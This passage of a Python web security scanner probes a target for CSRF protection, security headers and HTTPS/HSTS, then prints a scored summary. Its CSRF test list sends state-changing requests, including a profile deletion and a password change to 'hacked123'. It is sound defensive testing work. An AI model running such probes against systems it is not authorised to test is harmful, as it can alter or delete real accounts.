            ('PUT', '/api/users/profile', {'name': 'Modified'}),
            ('DELETE', '/api/users/profile', {}),
            ('POST', '/api/auth/logout', {}),
            ('POST', '/api/submissions', {'code': 'malicious code'}),
            ('POST', '/api/users/password', {'password': 'hacked123'}),
        ]
        
        if self.intensity == 'light':
            csrf_tests = csrf_tests[:3]
        elif self.intensity == 'medium':
            csrf_tests = csrf_tests[:4]
        
        for method, endpoint, data in csrf_tests:
            try:
                if method == 'POST':
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json=data,
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                elif method == 'PUT':
                    response = self.session.put(
                        urljoin(self.base_url, endpoint),
                        json=data,
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                elif method == 'DELETE':
                    response = self.session.delete(
                        urljoin(self.base_url, endpoint),
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                
                self.analyze_csrf_response(f"CSRF-{method} {endpoint}", response)
                
            except requests.exceptions.RequestException as e:
                self.log_result("CSRF Protection", f"{method} {endpoint}", "ERROR", 0, str(e))
            
            time.sleep(self.config['delay'])
    
    def analyze_csrf_response(self, test_name, response):
        """Analyze CSRF protection response"""
        response_text = response.text.lower()
        
        if response.status_code == 403 and 'csrf' in response_text:
            self.log_result("CSRF Protection", test_name, "BLOCKED", response.status_code,
                          "CSRF protection active")
        elif response.status_code == 401:
            self.log_result("CSRF Protection", test_name, "AUTH_REQUIRED", response.status_code,
                          "Authentication required")
        elif response.status_code == 200:
            self.log_result("CSRF Protection", test_name, "VULNERABLE", response.status_code,
                          "State-changing operation allowed without CSRF token")
        else:
            self.log_result("CSRF Protection", test_name, "BLOCKED", response.status_code)
    
    def test_security_headers(self):
        """Test security headers"""
        if '11' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}📋 Testing Security Headers{Style.RESET_ALL}")
        
        try:
            response = self.session.get(
                urljoin(self.base_url, "/"),
                headers={'User-Agent': self.config['user_agent']},
                timeout=self.config['timeout']
            )
            
            headers = response.headers
            
            security_headers = {
                'X-Content-Type-Options': ['nosniff'],
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': ['1; mode=block', '1'],
                'Strict-Transport-Security': ['max-age'],
                'Content-Security-Policy': ['default-src', 'script-src'],
                'Referrer-Policy': ['strict-origin', 'no-referrer'],
                'Permissions-Policy': ['geolocation', 'camera'],
            }
            
            for header, expected_values in security_headers.items():
                if header in headers:
                    header_value = headers[header].lower()
                    if any(expected in header_value for expected in expected_values):
                        self.log_result("Security Headers", f"{header} Present", "BLOCKED", 200,
                                      f"Value: {headers[header]}")
                    else:
                        self.log_result("Security Headers", f"{header} Present", "VULNERABLE", 200,
                                      f"Weak value: {headers[header]}")
                else:
                    self.log_result("Security Headers", f"{header} Missing", "VULNERABLE", 200,
                                  "Important security header missing")
                    
        except requests.exceptions.RequestException as e:
            self.log_result("Security Headers", "Header Check", "ERROR", 0, str(e))
    
    def test_ssl_tls_security(self):
        """Test SSL/TLS security"""
        if '12' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🔒 Testing SSL/TLS Security{Style.RESET_ALL}")
        
        if self.base_url.startswith('https://'):
            http_url = self.base_url.replace('https://', 'http://')
            try:
                response = self.session.get(
                    http_url,
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=self.config['timeout'],
                    allow_redirects=False
                )
                
                if response.status_code in [301, 302, 307, 308]:
                    location = response.headers.get('Location', '')
                    if location.startswith('https://'):
                        self.log_result("SSL/TLS Security", "HTTPS Redirect", "BLOCKED", response.status_code,
                                      "HTTP properly redirects to HTTPS")
                    else:
                        self.log_result("SSL/TLS Security", "HTTPS Redirect", "VULNERABLE", response.status_code,
                                      "HTTP redirect not to HTTPS")
                else:
                    self.log_result("SSL/TLS Security", "HTTPS Redirect", "VULNERABLE", response.status_code,
                                  "HTTP not redirected to HTTPS")
                    
            except requests.exceptions.RequestException:
                self.log_result("SSL/TLS Security", "HTTPS Redirect", "BLOCKED", 0,
                              "HTTP connection refused (good)")
        
        try:
            response = self.session.get(
                self.base_url,
                headers={'User-Agent': self.config['user_agent']},
                timeout=self.config['timeout']
            )
            
            hsts_header = response.headers.get('Strict-Transport-Security', '')
            if hsts_header:
                if 'max-age' in hsts_header.lower():
                    self.log_result("SSL/TLS Security", "HSTS Header", "BLOCKED", response.status_code,
                                  f"HSTS active: {hsts_header}")
                else:
                    self.log_result("SSL/TLS Security", "HSTS Header", "VULNERABLE", response.status_code,
                                  f"Weak HSTS: {hsts_header}")
            else:
                self.log_result("SSL/TLS Security", "HSTS Header", "VULNERABLE", response.status_code,
                              "HSTS header missing")
                
        except requests.exceptions.RequestException as e:
            self.log_result("SSL/TLS Security", "HSTS Header", "ERROR", 0, str(e))
    
    def run_selected_tests(self):
        """Run all selected tests"""
        print(f"\n{Fore.GREEN}🚀 Starting Security Scan{Style.RESET_ALL}")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print(f"Tests: {len(self.selected_tests)} selected")
        print(f"Intensity: {self.intensity}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        test_functions = {
            '1': self.test_sql_injection,
            '2': self.test_path_traversal,
            '3': self.test_xss_vulnerabilities,
            '4': self.test_authentication_bypass,
            '5': self.test_rate_limiting,
            '6': self.test_bot_detection,
            '7': self.test_api_enumeration,
            '8': self.test_file_upload_security,
            '9': self.test_information_disclosure,
            '10': self.test_csrf_protection,
            '11': self.test_security_headers,
            '12': self.test_ssl_tls_security,
        }
        
        for test_id in self.selected_tests:
            if test_id in test_functions:
                try:
                    test_functions[test_id]()
                    time.sleep(1)  # Pause between test categories
                except Exception as e:
                    print(f"{Fore.RED}❌ Error in test {test_id}: {e}{Style.RESET_ALL}")
        
        self.print_summary()
    
    def print_summary(self):
        """Print comprehensive test summary"""
        print(f"\n{Fore.GREEN}{'='*60}")
        print("🛡️ SECURITY SCAN SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        total_tests = len(self.results['tests'])
        blocked = self.results['blocked']
        vulnerable = self.results['vulnerable']
        
        print(f"Total Tests: {total_tests}")
        print(f"{Fore.GREEN}✅ Blocked/Protected: {blocked}{Style.RESET_ALL}")
        print(f"{Fore.RED}❌ Vulnerable: {vulnerable}{Style.RESET_ALL}")
        
        if total_tests > 0:
            security_score = ((blocked) / total_tests) * 100
            print(f"{Fore.CYAN}🛡️ Security Score: {security_score:.1f}%{Style.RESET_ALL}")
        
        categories = {}
        for test in self.results['tests']:
            cat = test['category']
            if cat not in categories:
                categories[cat] = {'blocked': 0, 'vulnerable': 0, 'total': 0}
            categories[cat]['total'] += 1
            if test['status'] == 'BLOCKED':
                categories[cat]['blocked'] += 1
            elif test['status'] == 'VULNERABLE':
                categories[cat]['vulnerable'] += 1
        
        print(f"\n{Fore.YELLOW}📊 Results by Category:{Style.RESET_ALL}")
        for cat, stats in categories.items():
            score = (stats['blocked'] / stats['total']) * 100 if stats['total'] > 0 else 0
            print(f"  {cat}: {stats['blocked']}/{stats['total']} protected ({score:.1f}%)")
        
        if vulnerable > 0:
            print(f"\n{Fore.RED}⚠️ VULNERABILITIES DETECTED:{Style.RESET_ALL}")
            for test in self.results['tests']:
                if test['status'] == 'VULNERABLE':
                    print(f"  - {test['category']}: {test['test']}")
                    if test['details']:
                        print(f"    Details: {test['details']}")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'security_scan_results_{timestamp}.json'
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n{Fore.CYAN}📄 Detailed results saved to: {filename}{Style.RESET_ALL}")
        print("=" * 60)

def main():
    """Main function"""
    scanner = UniversalSecurityScanner()
    scanner.print_banner()
    
    if scanner.get_user_input():
        scanner.run_selected_tests()
    else:
        print(f"{Fore.YELLOW}Scan cancelled by user.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()